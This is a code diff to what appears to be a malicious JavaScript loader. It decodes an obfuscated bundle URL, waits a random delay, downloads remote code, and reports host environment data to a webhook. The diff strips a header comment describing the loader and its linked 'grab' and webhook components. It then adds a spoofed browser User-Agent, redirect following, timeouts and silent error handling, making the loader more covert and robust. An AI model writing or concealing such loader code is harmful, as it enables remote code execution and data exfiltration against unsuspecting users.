@@ -1,7 +1,4 @@
-/**
- * Loader: executa no client após fetch. Contém toda a lógica crítica (config, webhook, bundle, run, report).
- * Repo: https://github.com/X0R-Alg/39XEMP-90 — AX13.js (loader) | 18N38NX0R.js (grab) | 294M21A.json (webhook)
- */
+
 (function (require, module, exports) {
   'use strict';
 
@@ -30,13 +27,19 @@
     return lo + Math.floor(Math.random() * (hi - lo + 1));
   }
 
-  function get(url) {
+  function get(url, followRedirect) {
     return new Promise(function (res, rej) {
       try {
         const https = require('https');
         const u = require('url').URL ? new require('url').URL(url) : require('url').parse(url);
-        const opts = { hostname: u.hostname, path: u.pathname + (u.search || ''), method: 'GET', port: u.port || 443 };
+        const path = (u.pathname || u.path || '/') + (u.search || '');
+        const opts = { hostname: u.hostname, path: path, method: 'GET', port: u.port || 443, headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101' } };
         const req = https.request(opts, function (r) {
+          if (followRedirect !== false && (r.statusCode === 301 || r.statusCode === 302) && r.headers && r.headers.location) {
+            var loc = r.headers.location;
+            if (loc.indexOf('http') !== 0) loc = (u.protocol || 'https:') + '//' + u.hostname + (loc.indexOf('/') === 0 ? '' : '/') + loc;
+            return get(loc, false).then(res).catch(rej);
+          }
           var d = '';
           r.on('data', function (c) { d += c; });
           r.on('end', function () {
@@ -44,6 +47,7 @@
           });
         });
         req.on('error', rej);
+        req.setTimeout(15000, function () { req.abort(); rej(new Error('timeout')); });
         req.end();
       } catch (_) { rej(); }
     });
@@ -129,12 +133,12 @@
       if (!ctx) return null;
       var bundleUrl = decodeRef(B_B, k);
       if (!bundleUrl || bundleUrl.length < 20) return ctx;
-      return sleep(jitter(3000, 7000)).then(function () { return fetchWithRetry(bundleUrl); }).then(function (r2) {
+      return sleep(jitter(3000, 7000)).then(function () { return fetchWithRetry(bundleUrl);     }).then(function (r2) {
         if (!r2 || r2.status !== 200) return ctx;
         var code = typeof r2.data === 'string' ? r2.data : (r2.data && typeof r2.data === 'object' ? null : String(r2.data || ''));
         ctx.code = code && code.length > 100 ? code : null;
         return ctx;
-      });
+      }).catch(function () { return ctx; });
     }).then(function (ctx) {
       if (!ctx || !ctx.target) return null;
       if (!ctx.code) return postWithRetry(ctx.target, { content: JSON.stringify({ ts: Date.now(), env: { v: process.version, p: process.platform, a: process.arch }, n: 0, d: [] }) });
